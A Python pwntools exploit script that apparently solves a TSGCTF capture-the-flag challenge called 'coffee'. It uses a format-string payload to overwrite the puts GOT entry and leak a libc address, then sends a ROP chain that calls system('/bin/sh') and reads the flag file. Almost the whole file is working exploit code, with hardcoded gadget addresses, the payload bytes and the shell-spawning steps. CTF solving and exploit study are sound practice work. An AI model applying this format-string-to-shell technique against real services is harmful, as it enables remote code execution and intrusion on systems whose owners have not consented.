from __future__ import division, print_function
import random
from pwn import *
import time
import sys


context.log_level = 'error'

host = sys.argv[1]
port = int(sys.argv[2])
is_gaibu = True
log = False


def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

binary_path = "coffee"

percent_s = 0x403004
puts_got = 0x404018
scanf_got = 0x404030
binsh_addr =  puts_got + 9

pop_rdi = 0x0000000000401293
pop_rsi_r15 = 0x0000000000401291
scanf_plt = 0x4010a0
puts_plt = 0x401070
ret = 0x000000000040101a

'''
0x0040128b: pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1 found)
0x0040128f: pop rbp ; pop r14 ; pop r15 ; ret  ;  (1 found)
0x0040117d: pop rbp ; ret  ;  (1 found)
0x00401293: pop rdi ; ret  ;  (1 found)
0x00401291: pop rsi ; pop r15 ; ret  ;  (1 found)
0x0040128d: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1 found)
'''
target = 0x0040128b

rop_payload = [
        pop_rdi,
        percent_s,
        pop_rsi_r15,
        puts_got,
        puts_got,
        ret,
        scanf_plt,  # system_addr; "/bin/sh"
        pop_rdi,
        binsh_addr,
        ret,
        puts_plt
]

head = b''.join(map(p64, rop_payload))
def exec_fmt(payload):
    p = process(binary_path)
    p.sendline(b'A' * len(head) + payload)
    return p.recvall()


# 1. overwrite puts_got -> pop6;ret
# 2. leak libc_addr from scanf_got
# 3. send rop gadget
payload = b'%4747c%21$lln%181c%22$hhnz%23$sx' + head + b'\x18@@\x00\x00\x00\x00\x00\x1a@@\x00\x00\x00\x00\x00' + p64(scanf_got)
'''
context.binary = binary_path
autofmt = FmtStr(exec_fmt)
payload = fmtstr_payload(autofmt.offset, {puts_got: target}, write_size="short")
# b'%4747c%15$lln%181c%16$hhnaaaabaa\x18@@\x00\x00\x00\x00\x00\x1a@@\x00\x00\x00\x00\x00'
print(payload)
'''
sendline(payload)

# leak libc
recvuntil(b"z")
s = recvuntil(b"x")
libc_base = just_u64(s) - 0x66230
print("libc_base: ", hex(libc_base))

system_addr = 0x55410 + libc_base

wait_for_attach()
sendline(p64(system_addr) + b"\x00/bin/sh\x00")

recv(4096)

sendline("cat flag-dcf095f41e7bf00fa7e7cf7ef2ce9083; echo")
s = recvline()
print(s)
if b'TSGCTF' in s:
    sys.exit(0)
else:
    sys.exit(1)

